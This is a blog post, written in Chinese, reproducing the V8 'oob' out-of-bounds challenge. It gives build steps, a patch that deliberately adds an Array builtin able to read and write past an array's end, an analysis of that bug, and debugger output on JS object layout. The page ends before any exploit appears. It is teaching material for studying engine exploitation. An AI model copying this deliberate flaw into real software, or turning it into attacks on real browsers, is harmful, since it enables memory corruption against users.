<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="OOB 复现 12345git checkout 6dc88c191f5ecc5389dc26efa3ca0907faef3598 -fgclient syncgit apply .&#x2F;pwn_patch&#x2F;oob.diff.&#x2F;tools&#x2F;dev&#x2F;v8gen.py x64.releaseninja -C .&#x2F;out.gn&#x2F;x64.release d8 在编译前，需要先在 out.gn&#x2F;x64.debu">
<meta property="og:type" content="article">
<meta property="og:title" content="V8+JavaScript pwn+类型混淆">
<meta property="og:url" content="http://example.com/2022/12/06/V8+JavaScript%20pwn+%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:description" content="OOB 复现 12345git checkout 6dc88c191f5ecc5389dc26efa3ca0907faef3598 -fgclient syncgit apply .&#x2F;pwn_patch&#x2F;oob.diff.&#x2F;tools&#x2F;dev&#x2F;v8gen.py x64.releaseninja -C .&#x2F;out.gn&#x2F;x64.release d8 在编译前，需要先在 out.gn&#x2F;x64.debu">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2022/12/06/V8+JavaScript%20pwn+%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86/1670253514098.png">
<meta property="article:published_time" content="2022-12-05T18:12:47.000Z">
<meta property="article:modified_time" content="2022-12-05T18:14:24.000Z">
<meta property="article:author" content="yhellow">
<meta property="article:tag" content="V8">
<meta property="article:tag" content="javascript pwn">
<meta property="article:tag" content="OOB">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2022/12/06/V8+JavaScript%20pwn+%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86/1670253514098.png">

<link rel="canonical" href="http://example.com/2022/12/06/V8+JavaScript%20pwn+%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>V8+JavaScript pwn+类型混淆 | Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/06/V8+JavaScript%20pwn+%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          V8+JavaScript pwn+类型混淆
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-12-06 02:12:47 / Modified: 02:14:24" itemprop="dateCreated datePublished" datetime="2022-12-06T02:12:47+08:00">2022-12-06</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span id="busuanzi_value_page_pv"></span>
            </span>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>27k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>25 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p><strong>OOB 复现</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git checkout 6dc88c191f5ecc5389dc26efa3ca0907faef3598 -f</span><br><span class="line">gclient sync</span><br><span class="line">git apply ./pwn_patch/oob.diff</span><br><span class="line">./tools/dev/v8gen.py x64.release</span><br><span class="line">ninja -C ./out.gn/x64.release d8</span><br></pre></td></tr></table></figure>
<p>在编译前，需要先在 <code>out.gn/x64.debug/args.gn</code> 中加入以下代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v8_enable_backtrace = <span class="literal">true</span></span><br><span class="line">v8_enable_disassembler = <span class="literal">true</span></span><br><span class="line">v8_enable_object_print = <span class="literal">true</span></span><br><span class="line">v8_enable_verify_heap = <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p>V8 常用调试命令如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set args --allow-natives-syntax --shell ./exp.js </span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">index b027d36..ef1002f 100644</span></span><br><span class="line"><span class="comment">--- a/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">+++ b/src/bootstrapper.cc</span></span><br><span class="line"><span class="meta">@@ -1668,6 +1668,8 @@</span> void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           Builtins::kArrayPrototypeCopyWithin, 2, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;fill&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFill, 1, false);</span><br><span class="line"><span class="addition">+    SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,</span></span><br><span class="line"><span class="addition">+                          Builtins::kArrayOob,2,false);</span></span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;find&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFind, 1, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;findIndex&quot;,</span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">index 8df340e..9b828ab 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="meta">@@ -361,6 +361,27 @@</span> V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,</span><br><span class="line">   return *final_length;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;  // namespace</span><br><span class="line"><span class="addition">+BUILTIN(ArrayOob)&#123;</span></span><br><span class="line"><span class="addition">+    uint32_t len = args.length();</span></span><br><span class="line"><span class="addition">+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSReceiver&gt; receiver;</span></span><br><span class="line"><span class="addition">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span></span><br><span class="line"><span class="addition">+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span></span><br><span class="line"><span class="addition">+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());</span></span><br><span class="line"><span class="addition">+    if(len == 1)&#123;</span></span><br><span class="line"><span class="addition">+        //read</span></span><br><span class="line"><span class="addition">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span></span><br><span class="line"><span class="addition">+    &#125;else&#123;</span></span><br><span class="line"><span class="addition">+        //write</span></span><br><span class="line"><span class="addition">+        Handle&lt;Object&gt; value;</span></span><br><span class="line"><span class="addition">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span></span><br><span class="line"><span class="addition">+        elements.set(length,value-&gt;Number());</span></span><br><span class="line"><span class="addition">+        return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"> </span><br><span class="line"> BUILTIN(ArrayPush) &#123;</span><br><span class="line">   HandleScope scope(isolate);</span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">index 0447230..f113a81 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="meta">@@ -368,6 +368,7 @@</span> namespace internal &#123;</span><br><span class="line">   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \</span><br><span class="line">   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \</span><br><span class="line">   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \</span><br><span class="line"><span class="addition">+  CPP(ArrayOob)                                                                \</span></span><br><span class="line">                                                                                \</span><br><span class="line">   /* ArrayBuffer */                                                            \</span><br><span class="line">   /* ES #sec-arraybuffer-constructor */                                        \</span><br><span class="line"><span class="comment">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">index ed1e4a5..c199e3a 100644</span></span><br><span class="line"><span class="comment">--- a/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">+++ b/src/compiler/typer.cc</span></span><br><span class="line"><span class="meta">@@ -1680,6 +1680,8 @@</span> Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">       return Type::Receiver();</span><br><span class="line">     case Builtins::kArrayUnshift:</span><br><span class="line">       return t-&gt;cache_-&gt;kPositiveSafeInteger;</span><br><span class="line"><span class="addition">+    case Builtins::kArrayOob:</span></span><br><span class="line"><span class="addition">+      return Type::Receiver();</span></span><br><span class="line"> </span><br><span class="line">     // ArrayBuffer functions.</span><br><span class="line">     case Builtins::kArrayBufferIsView:</span><br></pre></td></tr></table></figure>
<ul>
<li>为 JSArray 对象新增了一个 ArrayOob 方法：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">BUILTIN(ArrayOob)&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> len = args.length();</span><br><span class="line">    <span class="keyword">if</span>(len &gt; <span class="number">2</span>) <span class="keyword">return</span> ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">    Handle&lt;JSReceiver&gt; receiver;</span><br><span class="line">    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span><br><span class="line">    Handle&lt;JSArray&gt; <span class="built_in">array</span> = Handle&lt;JSArray&gt;::cast(receiver);</span><br><span class="line">    FixedDoubleArray elements = FixedDoubleArray::cast(<span class="built_in">array</span>-&gt;elements()); <span class="comment">/* 获取Array对象的elements */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> length = <span class="keyword">static_cast</span>&lt;<span class="keyword">uint32_t</span>&gt;(<span class="built_in">array</span>-&gt;length()-&gt;Number()); <span class="comment">/* 获取Array长度 */</span></span><br><span class="line">    <span class="keyword">if</span>(len == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="comment">//read</span></span><br><span class="line">        <span class="keyword">return</span> *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//write</span></span><br><span class="line">        Handle&lt;Object&gt; value;</span><br><span class="line">        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(<span class="number">1</span>)));</span><br><span class="line">        elements.<span class="built_in">set</span>(length,value-&gt;Number());</span><br><span class="line">        <span class="keyword">return</span> ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>如果输入参数个数为“1”：把下标为 <code>length</code> 的元素读取出来（越界读1字）</li>
<li>如果输入参数个数为“2”：在下标为 <code>length</code> 的元素处写入 <code>value</code>（越界写1字）</li>
<li>否则返回 <code>undefined_value</code> </li>
<li>PS：<code>this</code> 也算一个参数</li>
</ul>
<p><strong>JS 对象内存信息布局</strong></p>
<p>现在有 “越界读1字节/越界写1字节”，要想成功利用则需要先掌握 JSArray 对象的内存布局</p>
<ul>
<li>测试用 JavaScript 代码如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">Foo</span><span class="params">(properties, elements)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (let i = <span class="number">0</span>; i &lt; elements; i++) &#123;<span class="keyword">this</span>[i] = `element$&#123;i&#125;`&#125;</span><br><span class="line">    <span class="keyword">for</span> (let i = <span class="number">0</span>; i &lt; properties; i++) &#123;<span class="keyword">this</span>[`property$&#123;i&#125;`] = `property$&#123;i&#125;`&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> foo = <span class="keyword">new</span> Foo(<span class="number">12</span>, <span class="number">12</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> key in foo) &#123;</span><br><span class="line">    console.<span class="built_in">log</span>(`key:$&#123;key&#125;, value:$&#123;foo[key]&#125;`)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>使用 GDB 进行打印：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">d8&gt; %DebugPrint(foo)</span><br><span class="line">DebugPrint: <span class="number">0xebe3f60df81</span>: [JS_OBJECT_TYPE]</span><br><span class="line"> - <span class="built_in">map</span>: <span class="number">0x33a9ca10afe9</span> &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x0ebe3f60de81</span> &lt;Object <span class="built_in">map</span> = <span class="number">0x33a9ca10ac29</span>&gt;</span><br><span class="line"> - elements: <span class="number">0x0ebe3f60e019</span> &lt;FixedArray[<span class="number">17</span>]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - properties: <span class="number">0x0ebe3f60eb41</span> &lt;PropertyArray[<span class="number">3</span>]&gt; &#123;</span><br><span class="line">    #property0: <span class="number">0x0ebe3f60e221</span> &lt;String[<span class="number">9</span>]: property0&gt; (<span class="keyword">const</span> data field <span class="number">0</span>)</span><br><span class="line">    #property1: <span class="number">0x0ebe3f60e291</span> &lt;String[<span class="number">9</span>]: property1&gt; (<span class="keyword">const</span> data field <span class="number">1</span>)</span><br><span class="line">    #property2: <span class="number">0x0ebe3f60e339</span> &lt;String[<span class="number">9</span>]: property2&gt; (<span class="keyword">const</span> data field <span class="number">2</span>)</span><br><span class="line">    #property3: <span class="number">0x0ebe3f60e3d9</span> &lt;String[<span class="number">9</span>]: property3&gt; (<span class="keyword">const</span> data field <span class="number">3</span>)</span><br><span class="line">    #property4: <span class="number">0x0ebe3f60e491</span> &lt;String[<span class="number">9</span>]: property4&gt; (<span class="keyword">const</span> data field <span class="number">4</span>)</span><br><span class="line">    #property5: <span class="number">0x0ebe3f60e561</span> &lt;String[<span class="number">9</span>]: property5&gt; (<span class="keyword">const</span> data field <span class="number">5</span>)</span><br><span class="line">    #property6: <span class="number">0x0ebe3f60e649</span> &lt;String[<span class="number">9</span>]: property6&gt; (<span class="keyword">const</span> data field <span class="number">6</span>)</span><br><span class="line">    #property7: <span class="number">0x0ebe3f60e749</span> &lt;String[<span class="number">9</span>]: property7&gt; (<span class="keyword">const</span> data field <span class="number">7</span>)</span><br><span class="line">    #property8: <span class="number">0x0ebe3f60e861</span> &lt;String[<span class="number">9</span>]: property8&gt; (<span class="keyword">const</span> data field <span class="number">8</span>)</span><br><span class="line">    #property9: <span class="number">0x0ebe3f60e9a9</span> &lt;String[<span class="number">9</span>]: property9&gt; (<span class="keyword">const</span> data field <span class="number">9</span>)</span><br><span class="line">    #property10: <span class="number">0x0ebe3f60e9e9</span> &lt;String[<span class="number">10</span>]: property10&gt; (<span class="keyword">const</span> data field <span class="number">10</span>) properties[<span class="number">0</span>]</span><br><span class="line">    #property11: <span class="number">0x0ebe3f60eb89</span> &lt;String[<span class="number">10</span>]: property11&gt; (<span class="keyword">const</span> data field <span class="number">11</span>) properties[<span class="number">1</span>]</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: <span class="number">0x0ebe3f60e019</span> &lt;FixedArray[<span class="number">17</span>]&gt; &#123;</span><br><span class="line">           <span class="number">0</span>: <span class="number">0x0ebe3f60dfe9</span> &lt;String[<span class="number">8</span>]: element0&gt;</span><br><span class="line">           <span class="number">1</span>: <span class="number">0x0ebe3f60e0e9</span> &lt;String[<span class="number">8</span>]: element1&gt;</span><br><span class="line">           <span class="number">2</span>: <span class="number">0x0ebe3f60e101</span> &lt;String[<span class="number">8</span>]: element2&gt;</span><br><span class="line">           <span class="number">3</span>: <span class="number">0x0ebe3f60e119</span> &lt;String[<span class="number">8</span>]: element3&gt;</span><br><span class="line">           <span class="number">4</span>: <span class="number">0x0ebe3f60e131</span> &lt;String[<span class="number">8</span>]: element4&gt;</span><br><span class="line">           <span class="number">5</span>: <span class="number">0x0ebe3f60e149</span> &lt;String[<span class="number">8</span>]: element5&gt;</span><br><span class="line">           <span class="number">6</span>: <span class="number">0x0ebe3f60e161</span> &lt;String[<span class="number">8</span>]: element6&gt;</span><br><span class="line">           <span class="number">7</span>: <span class="number">0x0ebe3f60e179</span> &lt;String[<span class="number">8</span>]: element7&gt;</span><br><span class="line">           <span class="number">8</span>: <span class="number">0x0ebe3f60e191</span> &lt;String[<span class="number">8</span>]: element8&gt;</span><br><span class="line">           <span class="number">9</span>: <span class="number">0x0ebe3f60e1a9</span> &lt;String[<span class="number">8</span>]: element9&gt;</span><br><span class="line">          <span class="number">10</span>: <span class="number">0x0ebe3f60e1c1</span> &lt;String[<span class="number">9</span>]: element10&gt;</span><br><span class="line">          <span class="number">11</span>: <span class="number">0x0ebe3f60e1e1</span> &lt;String[<span class="number">9</span>]: element11&gt;</span><br><span class="line">       <span class="number">12</span><span class="number">-16</span>: <span class="number">0x0bb7280405b1</span> &lt;the_hole&gt;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="number">0x33a9ca10afe9</span>: [Map]</span><br><span class="line"> - type: JS_OBJECT_TYPE</span><br><span class="line"> - instance size: <span class="number">104</span></span><br><span class="line"> - inobject properties: <span class="number">10</span></span><br><span class="line"> - elements kind: HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: <span class="number">1</span></span><br><span class="line"> - <span class="keyword">enum</span> length: <span class="number">12</span></span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: <span class="number">0x33a9ca10af99</span> &lt;Map(HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - prototype_validity cell: <span class="number">0x0988cf39f971</span> &lt;Cell value= <span class="number">0</span>&gt;</span><br><span class="line"> - instance descriptors (own) #<span class="number">12</span>: <span class="number">0x0ebe3f60ea09</span> &lt;DescriptorArray[<span class="number">12</span>]&gt;</span><br><span class="line"> - layout descriptor: (nil)</span><br><span class="line"> - prototype: <span class="number">0x0ebe3f60de81</span> &lt;Object <span class="built_in">map</span> = <span class="number">0x33a9ca10ac29</span>&gt;</span><br><span class="line"> - constructor: <span class="number">0x0988cf39f689</span> &lt;JSFunction Foo (sfi = <span class="number">0x988cf39f381</span>)&gt;</span><br><span class="line"> - dependent code: <span class="number">0x0bb7280402c1</span> &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;</span><br><span class="line"> - construction counter: <span class="number">6</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="number">0</span>: <span class="string">&quot;element0&quot;</span>, <span class="number">1</span>: <span class="string">&quot;element1&quot;</span>, <span class="number">2</span>: <span class="string">&quot;element2&quot;</span>, <span class="number">3</span>: <span class="string">&quot;element3&quot;</span>, <span class="number">4</span>: <span class="string">&quot;element4&quot;</span>, <span class="number">5</span>: <span class="string">&quot;element5&quot;</span>, <span class="number">6</span>: <span class="string">&quot;element6&quot;</span>, <span class="number">7</span>: <span class="string">&quot;element7&quot;</span>, <span class="number">8</span>: <span class="string">&quot;element8&quot;</span>, <span class="number">9</span>: <span class="string">&quot;element9&quot;</span>, <span class="number">10</span>: <span class="string">&quot;element10&quot;</span>, <span class="number">11</span>: <span class="string">&quot;element11&quot;</span>, property0: <span class="string">&quot;property0&quot;</span>, property1: <span class="string">&quot;property1&quot;</span>, property2: <span class="string">&quot;property2&quot;</span>, property3: <span class="string">&quot;property3&quot;</span>, property4: <span class="string">&quot;property4&quot;</span>, property5: <span class="string">&quot;property5&quot;</span>, property6: <span class="string">&quot;property6&quot;</span>, property7: <span class="string">&quot;property7&quot;</span>, property8: <span class="string">&quot;property8&quot;</span>, property9: <span class="string">&quot;property9&quot;</span>, property10: <span class="string">&quot;property10&quot;</span>, property11: <span class="string">&quot;property11&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>打印 JS_OBJECT_TYPE：</li>
</ul>
